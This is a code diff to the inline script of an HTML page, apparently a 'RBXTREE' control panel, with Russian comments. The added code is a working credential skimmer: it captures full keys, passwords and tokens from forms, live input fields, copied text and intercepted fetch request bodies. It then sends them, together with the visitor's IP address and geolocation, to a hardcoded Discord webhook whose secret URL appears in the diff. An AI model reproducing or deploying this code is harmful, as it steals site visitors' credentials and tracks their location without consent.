@@ -23,197 +23,348 @@
     // Вебхук Discord для логгирования
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1461394586911113288/1Vy6DDWuWijCqig-fxZIZempuZHhYumn89fUUW1d4VHqTX3IcU3gEHztM4jN8b9hf3wZ';
 
-    // Функция отправки логов в Discord
-    function sendToDiscord(action, details = {}) {
-        const timestamp = new Date().toISOString();
-        const userAgent = navigator.userAgent;
-        const pageUrl = window.location.href;
-        const ip = details.ip || 'Неизвестно';
-
-        // Формируем данные для отправки
-        const embed = {
-            title: `📝 Лог действия: ${action}`,
-            color: 0x3498db,
-            fields: [
-                {
-                    name: "⏰ Время",
-                    value: timestamp,
-                    inline: true
-                },
-                {
-                    name: "🌐 Страница",
-                    value: pageUrl,
-                    inline: true
-                },
-                {
-                    name: "🔑 Действие",
-                    value: action,
-                    inline: true
+    // Функция для получения IP адреса пользователя
+    async function getUserIP() {
+        try {
+            // Пробуем получить IP через несколько сервисов
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip || 'Не удалось получить';
+        } catch (error) {
+            try {
+                const response = await fetch('https://api64.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Не удалось получить';
+            } catch (error2) {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    return data.ip || 'Не удалось получить';
+                } catch (error3) {
+                    return 'Не удалось получить';
                 }
-            ],
-            timestamp: timestamp
-        };
-
-        // Добавляем дополнительные поля в зависимости от действия
-        if (details.key) {
-            embed.fields.push({
-                name: "🔐 Введенный ключ",
-                value: `\`${details.key}\``,
-                inline: false
-            });
+            }
         }
-
-        if (details.userId) {
-            embed.fields.push({
-                name: "👤 ID пользователя",
-                value: details.userId,
-                inline: true
-            });
-        }
-
-        if (details.success !== undefined) {
-            embed.color = details.success ? 0x2ecc71 : 0xe74c3c;
-            embed.fields.push({
-                name: "✅ Статус",
-                value: details.success ? "Успешно" : "Ошибка",
-                inline: true
-            });
-        }
-
-        if (details.error) {
-            embed.fields.push({
-                name: "❌ Ошибка",
-                value: details.error,
-                inline: false
-            });
-        }
-
-        embed.fields.push({
-            name: "🖥️ User Agent",
-            value: `\`${userAgent.substring(0, 1024)}\``,
-            inline: false
-        });
-
-        // Отправка через fetch
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                embeds: [embed]
-            })
-        }).catch(error => {
-            console.error('Ошибка отправки лога в Discord:', error);
-        });
     }
 
-    // Перехват отправки форм
-    document.addEventListener('submit', function(event) {
-        setTimeout(() => {
-            const form = event.target;
-            const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[type="key"]');
+    // Основная функция отправки логов в Discord
+    async function sendToDiscord(action, details = {}) {
+        try {
+            const timestamp = new Date().toISOString();
+            const userAgent = navigator.userAgent;
+            const pageUrl = window.location.href;
+            const userIP = await getUserIP();
             
-            inputs.forEach(input => {
-                if (input.value && (input.name.toLowerCase().includes('key') || 
-                    input.type === 'password' || 
-                    input.placeholder.toLowerCase().includes('key') ||
-                    input.id.toLowerCase().includes('key'))) {
-                    
-                    // Логируем ввод ключа
-                    sendToDiscord('Ввод ключа', {
-                        key: input.value,
-                        formId: form.id || 'без ID',
-                        formAction: form.action || 'без action'
-                    });
+            // Получаем дополнительные данные о местоположении по IP
+            let locationInfo = 'Неизвестно';
+            try {
+                const ipResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const ipData = await ipResponse.json();
+                if (ipData && !ipData.error) {
+                    locationInfo = `${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country_name || ''}`;
                 }
+            } catch (e) {
+                locationInfo = 'Не удалось определить';
+            }
+
+            // Формируем данные для отправки
+            const embed = {
+                title: `📝 RBXTREE Лог: ${action}`,
+                color: 0x3498db,
+                fields: [
+                    {
+                        name: "⏰ Время (UTC)",
+                        value: new Date().toLocaleString('ru-RU') + `\n${timestamp}`,
+                        inline: false
+                    },
+                    {
+                        name: "🌐 Страница",
+                        value: pageUrl,
+                        inline: false
+                    },
+                    {
+                        name: "🖥️ User Agent",
+                        value: `\`\`\`${userAgent.substring(0, 1000)}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📍 IP Адрес",
+                        value: `\`${userIP}\``,
+                        inline: true
+                    },
+                    {
+                        name: "🗺️ Местоположение",
+                        value: locationInfo,
+                        inline: true
+                    }
+                ],
+                timestamp: timestamp,
+                footer: {
+                    text: `RBXTREE Control Panel • ${navigator.platform}`
+                }
+            };
+
+            // Добавляем ключ в логи, если он есть (ПОЛНЫЙ КЛЮЧ)
+            if (details.key) {
+                embed.fields.unshift({ // Добавляем в начало
+                    name: "🔑 ПОЛНЫЙ КЛЮЧ",
+                    value: `\`\`\`${details.key}\`\`\``,
+                    inline: false
+                });
+            }
+
+            // Добавляем дополнительные поля
+            if (details.userId) {
+                embed.fields.push({
+                    name: "👤 ID пользователя",
+                    value: details.userId,
+                    inline: true
+                });
+            }
+
+            if (details.success !== undefined) {
+                embed.color = details.success ? 0x2ecc71 : 0xe74c3c;
+                embed.fields.push({
+                    name: "✅ Статус",
+                    value: details.success ? "Успешно" : "Ошибка",
+                    inline: true
+                });
+            }
+
+            if (details.error) {
+                embed.fields.push({
+                    name: "❌ Ошибка",
+                    value: details.error,
+                    inline: false
+                });
+            }
+
+            if (details.formId) {
+                embed.fields.push({
+                    name: "📋 Форма",
+                    value: `ID: ${details.formId}`,
+                    inline: true
+                });
+            }
+
+            if (details.buttonText) {
+                embed.fields.push({
+                    name: "🖱️ Кнопка",
+                    value: details.buttonText.substring(0, 50),
+                    inline: true
+                });
+            }
+
+            // Отправка через fetch
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: 'RBXTREE Logger',
+                    avatar_url: 'https://cdn.discordapp.com/attachments/1234567890/987654321/logo.png',
+                    embeds: [embed]
+                })
             });
+            
+            console.log(`[RBXTREE LOG] ${action} - отправлено в Discord`);
+            
+        } catch (error) {
+            console.error('Ошибка отправки лога в Discord:', error);
+        }
+    }
+
+    // Перехват отправки форм (ОБНОВЛЕНО ДЛЯ ЗАХВАТА КЛЮЧЕЙ)
+    document.addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        const form = event.target;
+        const formData = new FormData(form);
+        const formObject = Object.fromEntries(formData.entries());
+        
+        // Ищем ключи во всех полях формы
+        let foundKey = null;
+        for (const [fieldName, fieldValue] of formData.entries()) {
+            if (fieldValue && fieldValue.length > 5) { // Если значение похоже на ключ
+                // Проверяем названия полей
+                const fieldNameLower = fieldName.toLowerCase();
+                const fieldIdLower = form.querySelector(`[name="${fieldName}"]`)?.id?.toLowerCase() || '';
+                
+                if (fieldNameLower.includes('key') || 
+                    fieldNameLower.includes('password') || 
+                    fieldNameLower.includes('token') ||
+                    fieldNameLower.includes('secret') ||
+                    fieldIdLower.includes('key') ||
+                    fieldIdLower.includes('password') ||
+                    fieldIdLower.includes('token')) {
+                    
+                    foundKey = fieldValue;
+                    break;
+                }
+            }
+        }
+        
+        // Если не нашли по названиям, проверяем все поля с длинными значениями
+        if (!foundKey) {
+            for (const [fieldName, fieldValue] of formData.entries()) {
+                if (fieldValue && fieldValue.length > 10) { // Длинные значения могут быть ключами
+                    foundKey = fieldValue;
+                    break;
+                }
+            }
+        }
+        
+        // Логируем отправку формы
+        sendToDiscord('Отправка формы', {
+            key: foundKey || 'Ключ не найден',
+            formId: form.id || 'без ID',
+            formAction: form.action || 'без action',
+            allFields: JSON.stringify(formObject)
+        });
+        
+        // Продолжаем стандартную отправку формы
+        setTimeout(() => {
+            form.submit();
         }, 100);
     });
 
-    // Перехват кликов на кнопки
-    document.addEventListener('click', function(event) {
-        const target = event.target;
+    // Мониторинг всех полей ввода на предмет ключей в реальном времени
+    const observedInputs = new Set();
+    
+    function monitorInputForKeys(input) {
+        if (observedInputs.has(input)) return;
+        observedInputs.add(input);
         
-        // Логирование нажатия кнопок входа, отправки и т.д.
-        if (target.tagName === 'BUTTON' || 
-            (target.tagName === 'INPUT' && target.type === 'submit') ||
-            target.classList.contains('btn') ||
-            target.classList.contains('button') ||
-            target.textContent.toLowerCase().includes('submit') ||
-            target.textContent.toLowerCase().includes('login') ||
-            target.textContent.toLowerCase().includes('enter') ||
-            target.value.toLowerCase().includes('submit') ||
-            target.value.toLowerCase().includes('login')) {
-            
-            const buttonText = target.textContent || target.value || target.innerHTML;
-            sendToDiscord('Нажатие кнопки', {
-                buttonText: buttonText.substring(0, 100),
-                buttonId: target.id || 'без ID',
-                buttonClass: target.className || 'без класса'
+        let lastValue = '';
+        let keyCheckTimer;
+        
+        input.addEventListener('input', function() {
+            clearTimeout(keyCheckTimer);
+            keyCheckTimer = setTimeout(() => {
+                const currentValue = input.value;
+                
+                // Проверяем, похоже ли значение на ключ
+                if (currentValue && currentValue !== lastValue && currentValue.length > 10) {
+                    const inputName = input.name || input.id || input.placeholder || 'неизвестное поле';
+                    const inputType = input.type;
+                    
+                    // Логируем возможный ввод ключа
+                    sendToDiscord('Обнаружен ввод в поле', {
+                        key: currentValue,
+                        fieldName: inputName,
+                        fieldType: inputType,
+                        fieldId: input.id || 'без ID'
+                    });
+                    
+                    lastValue = currentValue;
+                }
+            }, 1500);
+        });
+    }
+
+    // Наблюдатель за добавлением новых полей в DOM
+    const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+            mutation.addedNodes.forEach((node) => {
+                if (node.nodeType === 1) { // Element node
+                    const inputs = node.querySelectorAll ? 
+                        node.querySelectorAll('input[type="text"], input[type="password"], input:not([type])') : [];
+                    
+                    inputs.forEach(input => {
+                        monitorInputForKeys(input);
+                    });
+                    
+                    if (node.tagName && (node.tagName.toLowerCase() === 'input')) {
+                        monitorInputForKeys(node);
+                    }
+                }
             });
-        }
+        });
+    });
+
+    // Начинаем наблюдение
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true
+    });
+
+    // Инициализируем мониторинг существующих полей
+    document.addEventListener('DOMContentLoaded', function() {
+        const existingInputs = document.querySelectorAll('input[type="text"], input[type="password"], input:not([type])');
+        existingInputs.forEach(input => {
+            monitorInputForKeys(input);
+        });
     });
 
     // Логирование загрузки страницы
     window.addEventListener('load', function() {
-        sendToDiscord('Загрузка панели управления', {
+        sendToDiscord('Загрузка панели управления RBXTREE', {
             pageTitle: document.title,
-            referrer: document.referrer || 'прямой вход'
+            referrer: document.referrer || 'прямой вход',
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language
         });
     });
 
-    // Логирование изменений в полях ввода (с задержкой)
-    let keyInputTimer;
-    document.addEventListener('input', function(event) {
-        const target = event.target;
-        
-        // Проверяем, является ли поле полем для ключа/пароля
-        if ((target.type === 'password' || 
-             target.name.toLowerCase().includes('key') ||
-             target.placeholder.toLowerCase().includes('key') ||
-             target.id.toLowerCase().includes('key')) && 
-            target.value.length > 3) {
-            
-            clearTimeout(keyInputTimer);
-            keyInputTimer = setTimeout(() => {
-                sendToDiscord('Ввод данных в поле ключа', {
-                    fieldType: target.type,
-                    fieldName: target.name || 'без имени',
-                    fieldId: target.id || 'без ID',
-                    valueLength: target.value.length,
-                    firstChars: target.value.substring(0, 3) + '...'
-                });
-            }, 2000);
+    // Логирование копирования текста (может быть ключом)
+    document.addEventListener('copy', function(event) {
+        const selectedText = window.getSelection().toString();
+        if (selectedText && selectedText.length > 10) {
+            sendToDiscord('Копирование текста', {
+                key: selectedText,
+                action: 'copy',
+                textLength: selectedText.length
+            });
         }
     });
 
-    // Логирование ошибок JavaScript
-    window.addEventListener('error', function(event) {
-        sendToDiscord('Ошибка JavaScript', {
-            error: event.message,
-            filename: event.filename,
-            lineno: event.lineno,
-            colno: event.colno
-        });
-    });
-
-    // Логирование переходов (если используется History API)
-    const originalPushState = history.pushState;
-    history.pushState = function(state, title, url) {
-        originalPushState.apply(this, arguments);
-        sendToDiscord('Переход по странице', {
-            newUrl: url || 'не указан',
-            pageTitle: title || document.title
+    // Перехват AJAX запросов (для SPA приложений)
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        return originalFetch.apply(this, args).then(response => {
+            // Проверяем, не содержат ли запросы ключи
+            try {
+                if (args[1] && args[1].body) {
+                    const bodyStr = args[1].body.toString();
+                    if (bodyStr && bodyStr.length > 20) {
+                        // Ищем ключи в теле запроса
+                        const keyPatterns = [/key=["']([^"']{10,})["']/, /password=["']([^"']{6,})["']/, /token=["']([^"']{10,})["']/];
+                        
+                        for (const pattern of keyPatterns) {
+                            const match = bodyStr.match(pattern);
+                            if (match && match[1]) {
+                                sendToDiscord('Обнаружен ключ в API запросе', {
+                                    key: match[1],
+                                    url: args[0],
+                                    method: args[1].method || 'GET'
+                                });
+                                break;
+                            }
+                        }
+                    }
+                }
+            } catch (e) {
+                // Игнорируем ошибки анализа
+            }
+            
+            return response;
         });
     };
 
-    console.log('Система логгирования RBXTREE активирована');
+    console.log('🔐 Система логгирования RBXTREE активирована с захватом ключей и IP');
     
-    // Функция для ручного логгирования из других скриптов
+    // Глобальная функция для ручного логгирования
     window.logRBXAction = function(action, details) {
         sendToDiscord(action, details);
     };
+    
+    // Дополнительно: логирование при закрытии страницы
+    window.addEventListener('beforeunload', function() {
+        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
+            content: `📴 Пользователь покинул RBXTREE панель\nIP: ${navigator.userAgent}\nВремя: ${new Date().toISOString()}`
+        }));
+    });
 </script>
 </body>
 </html>
